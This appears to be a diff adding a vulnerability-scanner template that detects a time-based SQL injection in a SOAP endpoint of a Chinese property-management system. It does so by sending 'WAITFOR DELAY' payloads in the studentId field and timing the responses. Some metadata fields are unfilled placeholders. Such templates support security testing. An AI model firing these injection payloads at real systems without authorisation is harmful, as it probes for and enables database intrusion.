@@ -1,0 +1,63 @@
+id: xinshichuang-GetprintData-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 新视窗新一代物业管理系统 GetCertificateInfoByStudentId SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 417
+        SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
+              <studentId>1;WAITFOR DELAY '0:0:3'--</studentId>
+            </GetCertificateInfoByStudentId>
+          </soap:Body>
+        </soap:Envelope>
+      - |-
+        POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 417
+        SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
+              <studentId>1;WAITFOR DELAY '0:0:6'--</studentId>
+            </GetCertificateInfoByStudentId>
+          </soap:Body>
+        </soap:Envelope>
+      - |-
+        POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 417
+        SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
+              <studentId>1;WAITFOR DELAY '0:0:9'--</studentId>
+            </GetCertificateInfoByStudentId>
+          </soap:Body>
+        </soap:Envelope>
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
